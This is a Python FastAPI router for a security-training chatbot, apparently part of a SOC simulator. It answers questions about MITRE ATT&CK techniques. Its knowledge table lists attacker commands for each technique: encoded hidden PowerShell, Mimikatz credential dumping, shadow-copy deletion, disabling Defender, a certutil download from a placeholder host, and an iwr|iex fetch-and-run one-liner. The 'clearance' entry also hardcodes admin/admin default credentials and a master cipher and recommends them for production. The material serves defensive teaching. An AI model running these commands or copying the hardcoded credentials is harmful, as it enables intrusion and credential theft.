from fastapi import APIRouter, Depends
from ..database import get_db
from ..models.schemas import OracleRequest
import datetime
import random
import re

router = APIRouter(prefix="/api/oracle", tags=["oracle"])

# VANGUARD SUPREME INTELLIGENCE MATRIX (LEVEL 5.5 - ADAPTIVE)
PROJECT_KNOWLEDGE_MATRIX = {
    "t1059": {
        "keywords": ["powershell", "encoded", "scripting", "bypass", "amsi", "base64", "t1059"],
        "overview": "PowerShell is the hacker's favorite tool for stealth execution.",
        "mechanism": "Using `-enc` (Base64) allows attackers to hide suspicious strings like 'DownloadString' from traditional detection rules.",
        "steps": "1. Open the **Attack Simulator**. 2. Find 'PowerShell Encoded Command'. 3. Hit 'Execute' and monitor the **Telemetry Flux** for incoming raw logs.",
        "commands": "Attacker Payload:\n`powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBP...` (Base64 encoded block).",
        "benefits": "Bypasses simple static filename and string-based antivirus filters.",
        "guidance": "Compare the base64 string in Telemetry with our 'Decoded Buffer' alert to see the hidden intent."
    },
    "t1110": {
        "keywords": ["brute", "force", "credential", "stuffing", "login", "password", "guessing", "t1110"],
        "overview": "Brute Force is the classic 'keyring' attack on authentication doors.",
        "mechanism": "This attack submits hundreds of passwords per second. Our detection differentiates between 'Logon Type 3' (Network) and 'Type 10' (Remote).",
        "steps": "1. Go to the **Simulator**. 2. Execute 'Brute Force Attack'. 3. Pivot to the **Alert Center** to see 'Authentication Anomaly' alerts.",
        "commands": "Attacker Tool (Hydra):\n`hydra -l user -P rockyou.txt 192.168.1.10 ssh`\nDefender Search: `event_id: 4625`.",
        "benefits": "Grants legitimate account access without needing malware installation.",
        "guidance": "Observe the 'Source IP' frequency in Alert Center. If an IP fails >5 times in 60s, trigger SOAR."
    },
    "t1003": {
        "keywords": ["mimikatz", "dumping", "lsass", "credential", "password", "hash", "memory", "t1003"],
        "overview": "Mimikatz is the industry standard for credential theft from computer memory.",
        "mechanism": "It extracts NTLM hashes directly from the `lsass.exe` process's RAM security space.",
        "steps": "1. Trigger 'Credential Dumping' in Simulator. 2. Look for the **Host Alert** (Event ID 10). 3. Paste the PID into the **Forensics Sandbox** to find the parent.",
        "commands": "Mimikatz Syntax:\n`privilege::debug`, `sekurlsa::logonpasswords`.",
        "benefits": "Enables lateral movement using 'Pass-the-Hash' without ever knowing the real password.",
        "guidance": "Look for a process requesting '0x1fffff' access to `lsass.exe` in the Sandbox ancestry tree."
    },
    "t1486": {
        "keywords": ["ransomware", "encrypt", "locker", "entropy", "data", "encryption", "t1486"],
        "overview": "Ransomware targets your critical data to lock it for profit.",
        "mechanism": "Detection focuses on high-frequency file renames and entropy changes in data directories (e.g. Doc, XLS, PDF).",
        "steps": "1. Run 'Ransomware Simulation'. 2. Check the **Command Center** graphs for a spike in 'Host Anomalies'. 3. View the 'File Operations' stream in Telemetry.",
        "commands": "Common Routine:\n`vssadmin.exe delete shadows /all /quiet` (Deleting backups).",
        "benefits": "Total denial of service for the business until a ransom is paid.",
        "guidance": "See how the 'Telemetry Flux' shows massive file rename operations in milliseconds."
    },
    "t1134": {
        "keywords": ["privilege", "escalation", "token", "psexec", "impersonation", "sid", "admin", "t1134"],
        "overview": "Privilege Escalation is the process of becoming 'God' on the system.",
        "mechanism": "Attackers use tools like PsExec to assumption the identity of a SYSTEM or Domain Admin user.",
        "steps": "1. Select 'Privilege Escalation' in Simulator. 2. Monitor for 'Execution Anomaly' in the dashboard. 3. Check for User ID mismatches.",
        "commands": "PsExec Command:\n`psexec.exe \\\\target -s cmd.exe` (Spawning as SYSTEM).",
        "benefits": "Allows attackers to disable security tools and access restricted database folders.",
        "guidance": "Check the 'User Context' in Telemetry. If a low-privilege user spawns a SYSTEM process, it's a critical alert."
    },
    "t1047": {
        "keywords": ["wmi", "lateral", "remote", "movement", "rpc", "jumping", "t1047"],
        "overview": "Lateral Movement via WMI is 'stealthy' remote control.",
        "mechanism": "WMI allows hackers to run code on remote servers without installing agents or using RDP/SSH.",
        "steps": "1. Trigger 'Lateral Movement via WMI'. 2. Observe the internal connection in **Network Traffic**. 3. Look for `wmiprvse.exe` alerts.",
        "commands": "WMI Payload:\n`wmic /node:remote PROCESS call create 'bad_file.exe'`.",
        "benefits": "It uses legitimate Windows administration tools, making it very hard for simple AV to catch.",
        "guidance": "Trace the CIDR source in Telemetry to see which computer is acting as the 'Controller'."
    },
    "t1547": {
        "keywords": ["persistence", "registry", "runkeys", "autorun", "startup", "boot", "t1547"],
        "overview": "Persistence ensures the hacker stays inside even if you reboot.",
        "mechanism": "Adding entries to the 'Registry Run Keys' so malware starts automatically on login.",
        "steps": "1. Run 'Persistence via Registry'. 2. Go to **Telemetry Flux**. 3. Filter for 'Registry Modification' events.",
        "commands": "Registry Add:\n`reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Mal /t REG_SZ /d \"C:\\temp\\mal.exe\"`.",
        "benefits": "Prevents the loss of access if the system is patched or restarted.",
        "guidance": "Look for unknown paths in the 'Value Data' column of the registry logs."
    },
    "t1562": {
        "keywords": ["defender", "av", "disable", "stop", "evasion", "security", "t1562"],
        "overview": "Defense Evasion targets the SOC's 'Eyes'.",
        "mechanism": "Hackers try to stop the 'WinDefend' service or disable real-time monitoring.",
        "steps": "1. Execute 'Disabling Defender' in Simulator. 2. Observe the **Critical Flash Alert** in the HUD. 3. Check for 'Service Stop' logs.",
        "commands": "Disable Command:\n`Set-MpPreference -DisableRealtimeMonitoring $true`.",
        "benefits": "Allows the attacker to bring in louder, more destructive tools without being noticed.",
        "guidance": "Any attempt to modify security settings without an authorized admin context is a Level 1 critical block."
    },
    "t1071": {
        "keywords": ["beacon", "c2", "dns", "heartbeat", "command", "control", "exfiltration", "t1071"],
        "overview": "DNS Beaconing is the 'Phone Home' signal of an infected host.",
        "mechanism": "Stolen data is hidden inside DNS requests to a domain the hacker controls.",
        "steps": "1. Run 'DNS Beaconing' in Simulator. 2. Go to **Command Center**. 3. Look for the 'Network Traffic' spike to unusual subdomains.",
        "commands": "Beacon Logic:\n`<stolen_data_chunk_hex>.hacker-domain.com` query pattern.",
        "benefits": "Bypasses standard firewall rules as UDP/53 (DNS) is almost always open.",
        "guidance": "Count the frequency of DNS requests. If a host sends 1000 requests per minute to one domain, it's a beacon."
    },
    "t1046": {
        "keywords": ["scanning", "recon", "nmap", "ports", "probing", "discovery", "network", "t1046"],
        "overview": "Network Scanning is how hackers map our internal grid.",
        "mechanism": "Probing all 65,535 ports to find open services like SQL or RDP.",
        "steps": "1. Select 'Network Scanning'. 2. View the **Network Traffic** layer in the HUD. 3. Look for the 'Sequential Port Probe' pattern.",
        "commands": "Nmap Command:\n`nmap -sS -v -p- <target_subnet>`.",
        "benefits": "Identifies where the 'Weak Doors' (old applications, SQL servers) are located.",
        "guidance": "Filter Telemetry by 'Source IP'. If one IP hits 50+ ports in 1s, it's a scan."
    },
    "t1105": {
        "keywords": ["certutil", "download", "ingress", "fetching", "malware", "t1105"],
        "overview": "Certutil is a 'Living Off The Land' (LOLBAS) download method.",
        "mechanism": "Hackers use the built-in Windows certificate tool to download malware from the internet.",
        "steps": "1. Run 'Certutil Download' in Simulator. 2. Check **Telemetry** for `certutil.exe` network connections. 3. View the `-urlcache` flag.",
        "commands": "Download Command:\n`certutil.exe -urlcache -split -f http://hack.com/mal.exe`.",
        "benefits": "Trusted by Windows, so it often bypasses standard 'Exclusion' lists in firewalls.",
        "guidance": "Any `certutil.exe` process with an external URL in the command line should be treated as suspicious."
    },
    "t1041": {
        "keywords": ["exfiltration", "stealing", "upload", "theft", "outbound", "data", "t1041"],
        "overview": "Exfiltration is the final goal: Stealing the data.",
        "mechanism": "Massive amounts of data are sent to an external server via encrypted tunnels.",
        "steps": "1. Select 'Data Exfiltration' in Simulator. 2. Watch the **Upload Data** graph in Command Center. 3. Check for 'Long Duration' sessions.",
        "commands": "Upload Payload:\n`POST /upload HTTP/1.1`, usually zipped files like `Archive.zip`.",
        "benefits": "Real-world loss: IPs, passwords, or customer data is gone.",
        "guidance": "Look for 'Egress Anomalies' in Behavioral Analytics. If someone uploads 2GB while usually uploading 2MB, alert."
    },
    "deception": {
        "keywords": ["deception", "honeypot", "decoy", "trap", "fake", "canary", "tokens", "trap"],
        "overview": "Deception Ops uses 'Booby Traps' to catch hackers before they find real data.",
        "mechanism": "We place 'Honey-Tokens' (fake credentials) in the system that trigger a Critical Alert the moment they are touched.",
        "steps": "1. Open the **Deception Ops** HUD. 2. Select a directory and click '**Deploy Canary**'. 3. Monitor the Status Grid for any access signal.",
        "commands": "Setup Logic:\n`DEPLOY_HONEYTOKEN --type file --path C:\\Admin_Pass`.",
        "benefits": "Zero False Positives. No real user touches these files. It provides 100% confirmation of an intruder.",
        "guidance": "Always deploy 2-3 decoys before running any attack simulator tests."
    },
    "forensics": {
        "keywords": ["forensics", "sandbox", "ancestry", "parents", "pid", "tracking", "history", "tree"],
        "overview": "The Forensic Sandbox lets you see exactly *how* a hacker got in.",
        "mechanism": "We build 'Process Ancestry' trees to trace a bad file back to its source (e.g. Word -> CMD -> Malicious.exe).",
        "steps": "1. Open the **Forensics Sandbox**. 2. Paste a Process Name or PID from an alert into the search box. 3. Click '**Trace Ancestry**' to view the visual tree.",
        "commands": "Common Search Targets:\n`powershell.exe`, `lsass.exe`, `cmd.exe`, `wmic.exe`.",
        "benefits": "Root Cause Analysis. It explains the 'Ghost in the Machine' by showing exactly how a hacker spawned a bad file.",
        "guidance": "Look for 'Mismatched Parents'. For example, if `Chrome.exe` spawns `cmd.exe`, it's an exploit attempt."
    },
    "soar": {
        "keywords": ["soar", "automation", "playbook", "response", "action", "neutralize", "block", "ban"],
        "overview": "SOAR is the system's ability to 'Fight Back' automatically.",
        "mechanism": "Automation playbooks can block IPs or isolate computers the second a threat is detected via internal API hooks.",
        "steps": "1. Go to **Case Management**. 2. Find an active incident. 3. Toggle the '**Automatic Containment**' or '**Block IP**' switch on the sidebar.",
        "commands": "SOAR Payload:\n`BAN_IP --target 192.168.1.50 --duration 24h`.",
        "benefits": "Response time drops from 30 minutes to 30 milliseconds, preventing 'Ransomware' spreads.",
        "guidance": "Try the 'One-Click Block' on a simulated IP to see the firewall telemetry update."
    },
    "behavioral": {
        "keywords": ["behavioral", "anomaly", "profile", "zscore", "deviation", "baseline", "math"],
        "overview": "Behavioral analytics learns what 'Normal' looks like for our facility.",
        "mechanism": "Uses Z-score (standard deviation) to flag any activity that deviates from your common 14-day profile.",
        "steps": "1. Navigate to **Analyst Profiling**. 2. Click on a User Avatar. 3. Study the 'Normal Curve'—any hit in the 'Critical Red' zone is an anomaly.",
        "commands": "Math Check:\n`Score = (Log_Value - Mean) / StdDev`. If score > 3, alert.",
        "benefits": "Catches 'Living off the Land' hackers who use real passwords but at weird times.",
        "guidance": "Look for logins after 2 AM from unknown IPs. That is a primary behavioral trigger."
    },
    "agent": {
        "keywords": ["agent", "sensor", "connect", "remote", "deploy", "telemetry", "connection"],
        "overview": "Our Zero-Install Agents allow you to capture logs from any external machine.",
        "mechanism": "Uses a PowerShell one-liner (iwr | iex) to download a lightweight sensor that streams logs back to our Ingest API.",
        "steps": "1. Navigate to the **Remote Sensors** page in the HUD. 2. Copy the 'Deployment One-Liner' for your server IP. 3. Run the command as Admin on the machine you want to monitor.",
        "commands": "Deployment One-Liner:\n`$s=\"127.0.0.1\"; iwr -useb \"http://$s:8080/api/download/agent\" | iex`",
        "benefits": "Extends our facility's eyes beyond the local network, allowing us to monitor remote servers in real-time.",
        "guidance": "Once connected, the new machine will automatically appear in your 'Remote Sensors' table."
    },
    "clearance": {
        "keywords": ["clearance", "cipher", "password", "login", "key", "master", "credentials"],
        "overview": "The Clearance protocols ensure only Level 5 Analysts can enter the facility.",
        "mechanism": "The login terminal uses a dual-verification system (Operator ID + Decryption Phrase).",
        "steps": "1. Go to the **Login Screen**. 2. Enter your Operator ID. 3. Provide the Decryption Phrase.",
        "commands": "Default Credentials:\n- **Operator ID:** `admin` \n- **Decryption Phrase:** `admin` \n\nMaster Registration Cipher:\n- **Cipher:** `MASTER-AI-KEY` (Required for new registrations).",
        "benefits": "Ensures total neural security for the SOC's databanks.",
        "guidance": "Use 'admin/admin' for immediate access to the production HUD."
    }
}

@router.post("/chat")
async def chat_with_oracle(payload: OracleRequest, db = Depends(get_db)):
    msg = payload.message.lower()
    msg_clean = re.sub(r'[^\w\s\.]', '', msg) # Keep dots for IPs
    msg_words = set(msg_clean.split())
    
    # --- PHASE 0: OPERATIONAL SENTINEL COMMANDS (ACTUAL SOAR INTERFACE) ---
    # Detects: "block 192.168.1.5", "isolate server-01"
    block_match = re.search(r'block\s+([\d\.]+)', msg)
    if block_match:
        target_ip = block_match.group(1)
        response_text = (
            f"⚡ **VANGUARD OPERATIONAL COMMAND: NEURAL SEVERANCE**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📡 **ACTION:** Initiating block protocol on `{target_ip}`.\n"
            f"🛠️ **STATUS:** SOAR Payload dispatched to Backend Firewall.\n\n"
            f"🎯 **CONFIRMATION:** Target IP {target_ip} is now blacklisted on all facility egress points."
        )
        return {"reply": response_text, "action": "EXECUTE_BLOCK", "target": target_ip, "timestamp": datetime.datetime.now().isoformat()}

    # --- PHASE 1: NEURAL DECODING (IF BASE64 IS DETECTED) ---
    if len(msg) > 30:
        b64_match = re.search(r'[A-Za-z0-9+/]{20,}', payload.message)
        if b64_match:
            import base64
            try:
                potential_b64 = b64_match.group(0)
                decoded = base64.b64decode(potential_b64).decode('utf-16', errors='ignore')
                if len(decoded) > 5:
                    response_text = (
                        f"⚡ **VANGUARD NEURAL DECODER: PAYLOAD ANALYSIS**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"🔓 **DECODED STRING:**\n`{decoded}`\n\n"
                        f"🎯 **ANALYSIS:** This appears to be an obfuscated PowerShell script. MITRE: T1059. \n"
                        f"💡 **CONTEXT:** Hackers use this to hide 'DownloadString' or 'C2 connections'."
                    )
                    return {"reply": response_text, "action": "NEURAL_DECODE", "timestamp": datetime.datetime.now().isoformat()}
            except: pass

    # --- PHASE 2: NEURAL MATCHING (CONTEXT-AWARE) ---
    found_node = None
    best_key = None
    matches = []

    for key, data in PROJECT_KNOWLEDGE_MATRIX.items():
        kws = set(data.get("keywords", []))
        if key in msg_words or not msg_words.isdisjoint(kws):
            matches.append(key)

    if matches:
        if any(w in msg_words for w in ["sandbox", "tree", "pid", "ancestry", "history"]):
            best_key = "forensics" if "forensics" in matches else matches[0]
        elif any(w in msg_words for w in ["decoy", "fake", "honey", "trap", "honeypot"]):
            best_key = "deception" if "deception" in matches else matches[0]
        elif any(w in msg_words for w in ["agent", "sensor", "remote", "connect"]):
            best_key = "agent" if "agent" in matches else matches[0]
        else:
            best_key = matches[0]
        
        found_node = PROJECT_KNOWLEDGE_MATRIX[best_key]

    if found_node:
        intent = "overview"
        if any(w in msg_words for w in ["how", "mechanism", "work", "logic", "behind"]): intent = "mechanism"
        if any(w in msg_words for w in ["step", "steps", "do", "implement", "how-to"]): intent = "steps"
        if any(w in msg_words for w in ["benefit", "why", "save", "good", "pros"]): intent = "benefits"
        if any(w in msg_words for w in ["command", "syntax", "code", "example", "payload", "commands", "query"]): intent = "commands"
        
        node_name = str(best_key).upper()
        intent_title = intent.replace("_", " ").upper()
        
        response_text = (
            f"⚡ **VANGUARD NEURAL BRIEFING: {node_name} ({intent_title})**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **{intent.upper()}:**\n{found_node[intent]}\n\n"
            f"💡 **CONTEXT:** {found_node['overview']}\n\n"
            f"🎯 **OPERATIONAL SENTINEL GUIDANCE:** {found_node['guidance']}"
        )
        return {"reply": response_text, "action": f"INTEL_{node_name}_{intent.upper()}", "timestamp": datetime.datetime.now().isoformat()}

    # --- PHASE 3: LIVE THREAT SCAN ---
    if any(k in msg_words for k in ["threat", "active", "hacker", "ip", "block", "attack", "status", "briefing"]):
        latest_threat = await db.alerts.find({"severity": {"$regex": "^critical$|^high$", "$options": "i"}}).sort("triggered_time", -1).limit(1).to_list(length=1)
        if latest_threat:
            t = latest_threat[0]
            response_text = (
                f"🚨 **VANGUARD LIVE-INTEL: MISSION CRITICAL**\n\n"
                f"• **RULE:** {t.get('rule_name')}\n"
                f"• **SOURCE:** `{t.get('source_ip', 'Internal')}`\n"
                f"• **MITRE:** {t.get('mitre_attack_id', 'T1000')}\n\n"
                "**SENTINEL ACTION:** Proceed to 'Case Management'. Use `block {t.get('source_ip')}` right here to neutralize."
            )
        else:
            response_text = "📡 **VANGUARD LIVE-INTEL:** All telemetry arrays are reporting GREEN. 0 active critical signals detected. Facility is secure."
        return {"reply": response_text, "action": "THREAT_SCAN", "timestamp": datetime.datetime.now().isoformat()}

    return {
        "reply": "👋 **Vanguard Neural Interface Online. Status: Operational Sentinel.**\n\nI am your direct interface for both technical intelligence and facility orchestration. Beyond technical deep-dives (Attacks, Forensics, Deception), I can now perform the following for you:\n\n"
                 "• **SOAR Control:** Tell me to `block <IP>` and I will execute the containment protocol.\n"
                 "• **Neural Decoding:** Paste any encoded PowerShell string and I will decrypt it for you.\n"
                 "• **HUD Navigation:** Ask for 'Steps to Sandbox' and I will reveal the operational blueprint.\n\n"
                 "Which tactical objective are we pursuing, Analyst?",
        "action": "IDLE_MENTOR_FALLBACK",
        "timestamp": datetime.datetime.now().isoformat()
    }
